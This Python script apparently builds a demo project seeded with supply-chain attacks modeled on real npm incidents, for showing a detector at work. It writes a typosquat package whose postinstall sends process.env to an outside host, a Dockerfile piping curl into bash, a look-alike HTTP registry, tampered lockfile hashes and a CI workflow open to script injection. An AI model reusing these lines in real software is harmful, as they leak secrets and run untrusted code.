"""Build demo/compromised/ from demo/baseline/ by planting realistic supply-chain attacks.

Every planted issue mirrors a real incident so the demo is believable:
  A. event-stream 3.3.4 -> 3.3.6 pulling in flatmap-stream@0.1.1        (2018 event-stream backdoor)
  B. developer typo 'crossenv' instead of 'cross-env', with a postinstall (2017 crossenv credential stealer)
  C. lodash@4.17.15 tarball hash silently changed in the lockfile         (lockfile tampering)
  D. minimist re-pointed to a plain-HTTP look-alike mirror                 (lockfile injection / MITM)
  E. 'debug-helper-utils' added to the lockfile only, from a private host  (hidden dependency / dependency confusion)
  F. ua-parser-js@0.7.29 orphan entry                                      (2021 ua-parser-js account hijack)
  G. Dockerfile: mutable + untrusted base image, curl | bash
  H. CI workflow: action pinned to a branch, script injection

Nothing here is executable malware: the "malicious" scripts are inert strings in JSON fixtures.
"""
import json
import shutil
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "demo"
base, out = ROOT / "baseline", ROOT / "compromised"
if out.exists():
    shutil.rmtree(out)
out.mkdir(parents=True)

pkg = json.loads((base / "package.json").read_text())
lock = json.loads((base / "package-lock.json").read_text())
P = lock["packages"]

# A. event-stream backdoor
pkg["dependencies"]["event-stream"] = "3.3.6"
P[""]["dependencies"]["event-stream"] = "3.3.6"
es = P["node_modules/event-stream"]
es["version"] = "3.3.6"
es["resolved"] = "https://registry.npmjs.org/event-stream/-/event-stream-3.3.6.tgz"
es["integrity"] = "sha512-dGXNg4F/FgVzlApjzItL+7naHutA3fDqbV/zAZqDDlXTjiMnQmZKu+prImWKszeBM5UQeGvAl3u1wBiKeDh61g=="
es.setdefault("dependencies", {})["flatmap-stream"] = "^0.1.0"
P["node_modules/flatmap-stream"] = {
    "version": "0.1.1",
    "resolved": "https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz",
    "integrity": "sha512-lAq4tLbm3sidmdCN8G3ExaxH7cUCtP5mgDvrYowsx84dcYkJJ4I28N7gkxA6+YlSXzaGLJYIDEi9WGfXOMiaApw==",
}

# B. typosquat with credential-stealing postinstall
pkg["devDependencies"]["crossenv"] = "^6.1.1"
P[""].setdefault("devDependencies", {})["crossenv"] = "^6.1.1"
P["node_modules/crossenv"] = {
    "version": "6.1.1",
    "resolved": "https://registry.npmjs.org/crossenv/-/crossenv-6.1.1.tgz",
    "integrity": "sha512-Zb8ZgS3Ra0dCUc1fmgxE5spdRP1TLJgQdbZ7oDGp7yfRcbG3e6HsJGb4hZ9eOxVfqJkYQXEYDctPGdzlFj6Q6A==",
    "dev": True,
    "hasInstallScript": True,
    "dependencies": {"cross-spawn": "^7.0.1"},
}
nm = out / "node_modules" / "crossenv"
nm.mkdir(parents=True)
(nm / "package.json").write_text(json.dumps({
    "name": "crossenv", "version": "6.1.1",
    "scripts": {"postinstall": "node -e \"require('http').request({host:'npm.hacktask.net',path:'/log/?'+"
                               "Buffer.from(JSON.stringify(process.env)).toString('base64')}).end()\""},
}, indent=2))

# C. integrity swap on an unchanged version
import base64, hashlib
P["node_modules/lodash"]["integrity"] = "sha512-" + base64.b64encode(hashlib.sha512(b"tampered lodash tarball").digest()).decode()

# D. plain-HTTP look-alike mirror
P["node_modules/minimist"]["resolved"] = "http://registry.npmjs-cdn.com/minimist/-/minimist-1.2.5.tgz"

# E. lockfile-only dependency from a private host, no integrity
P[""]["dependencies"]["debug-helper-utils"] = "1.0.2"
P["node_modules/debug-helper-utils"] = {
    "version": "1.0.2",
    "resolved": "https://npm.corp-artifacts.net/debug-helper-utils/-/debug-helper-utils-1.0.2.tgz",
    "hasInstallScript": True,
}

# F. orphaned hijacked version nobody depends on
P["node_modules/ua-parser-js"] = {
    "version": "0.7.29",
    "resolved": "https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-0.7.29.tgz",
    "integrity": "sha512-2pzsBMrqb1vXnc0/lyeHSOaDGvm+P8SFmHNdLBUYvP0tP+uO2gCxoGJRhxHJ0RgD8AAd3Tq9MG5HjYCbfi0sfVg==",
}

(out / "package.json").write_text(json.dumps(pkg, indent=2) + "\n")
(out / "package-lock.json").write_text(json.dumps(lock, indent=2) + "\n")

# G. container
(out / "Dockerfile").write_text("""FROM node:latest AS build
WORKDIR /app
COPY package*.json ./
RUN curl -fsSL https://get.example-tools.io/setup.sh | bash
RUN npm ci
COPY . .

FROM fastbuilds/node-runtime:18
WORKDIR /app
COPY --from=build /app .
CMD ["node", "server.js"]
""")
# H. CI
wf = out / ".github" / "workflows"
wf.mkdir(parents=True)
(wf / "ci.yml").write_text("""name: CI
on:
  issues:
    types: [opened]
  push:
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
      - uses: quick-actions/npm-cache@main
      - run: npm ci
      - run: echo "Triaging ${{ github.event.issue.title }}"
""")
(out / "server.js").write_text("const express = require('express');\nexpress().listen(3000);\n")
print(f"wrote {out}")
